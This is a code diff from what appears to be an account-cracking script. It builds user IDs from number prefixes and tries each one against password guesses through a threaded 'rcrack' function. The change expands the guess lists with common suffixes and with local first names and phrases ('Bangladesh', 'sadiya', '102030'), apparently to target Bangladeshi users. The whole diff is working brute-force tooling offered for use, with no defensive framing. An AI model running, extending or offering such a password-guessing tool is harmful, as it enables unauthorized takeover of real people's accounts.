@@ -163,7 +163,7 @@ def v1():
         print(50*'_')
         for guru in user:
             uid = kode+kodex+guru+doamin
-            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
+            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kode+'11',kode+'111',kode+'@',kode+'@@',kode+'@@@',kode+'@@@@']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [♥] Crack process has been completed')
@@ -227,7 +227,7 @@ def v3():
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
+            pwx = [kode + kodex + kod + guru, kod + guru, kodex + guru, kode + kodex + kod, kod + kodex + kode, kode + kodex, kodex + kod, kodex + kod + guru, kode + guru, 'Bangladesh', 'i love you', 'sadiya', 'fariya', 'sanjida', 'fatema', 'Farjana', 'jannat', '102030', '203040', '304050', '405060', '506070', '607080', '708090', '809010', 'mababa', 'shahin', 'sumaiya', 'hridoy']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [♥] Crack process has been completed')
